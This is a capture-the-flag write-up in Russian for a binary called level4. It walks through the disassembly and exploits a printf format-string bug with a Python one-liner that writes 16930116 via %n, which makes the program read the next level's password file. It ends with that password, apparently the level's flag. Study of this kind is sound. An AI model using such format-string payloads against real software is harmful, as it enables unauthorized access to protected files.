Этот уровень похож на предыдущий, только рна этот раз сравнение идет с 16930116.

Дисассемблируем main:
   0x080484a7 <+0>:	push   %ebp
   0x080484a8 <+1>:	mov    %esp,%ebp
=> 0x080484aa <+3>:	and    $0xfffffff0,%esp
   0x080484ad <+6>:	call   0x8048457 <n>          В main производится только вызов функции n
   0x080484b2 <+11>:	leave
   0x080484b3 <+12>:	ret


Дисассемблируем функцию n:
   0x08048457 <+0>:	push   %ebp
   0x08048458 <+1>:	mov    %esp,%ebp
   0x0804845a <+3>:	sub    $0x218,%esp            Выделена память размером 536
   0x08048460 <+9>:	mov    0x8049804,%eax
   0x08048465 <+14>:	mov    %eax,0x8(%esp)
   0x08048469 <+18>:	movl   $0x200,0x4(%esp)
   0x08048471 <+26>:	lea    -0x208(%ebp),%eax      
   0x08048477 <+32>:	mov    %eax,(%esp)
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>  Вызывается функция fgets, эта версия gets защищена от  переполнения буфера.
   0x0804847f <+40>:	lea    -0x208(%ebp),%eax
   0x08048485 <+46>:	mov    %eax,(%esp)
   0x08048488 <+49>:	call   0x8048444 <p>          Вызов функции p
   0x0804848d <+54>:	mov    0x8049810,%eax
   0x08048492 <+59>:	cmp    $0x1025544,%eax        Сравнение регистра %eax с 16930116
   0x08048497 <+64>:	jne    0x80484a5 <n+78>       Команда jne(переход, если не равно), а именно переход на конец функции
   0x08048499 <+66>:	movl   $0x8048590,(%esp)
   0x080484a0 <+73>:	call   0x8048360 <system@plt>   Системный вызов system("/bin/cat /home/user/level5/.pass"), который нам нужен
   0x080484a5 <+78>:	leave
   0x080484a6 <+79>:	ret
   
Дисассемблируем функцию p:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x8(%ebp),%eax
   0x0804844d <+9>:	mov    %eax,(%esp)
   0x08048450 <+12>:	call   0x8048340 <printf@plt>    Здесь происходит только вызов функции printf
   0x08048455 <+17>:	leave
   0x08048456 <+18>:	ret

Нам нужно сделать вызов функции system, который находится в функции n, для этого как и в прошлый раз мы должны воспользоваться уязвимостью printf,
уязвимостью форматной строки. Для этого мы должны узнать на какой адрес записывается наша строка:
./level4
AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
AAAA b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
Наша строка AAAA записалась в 12й ячейке, далее нам нужно записать число 16930116 в ячейку 0x8049810, пишем такую команду:
   (python -c "print('\x10\x98\x04\x08' + '%16930112x%12\$n')") | ~/level4
   0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

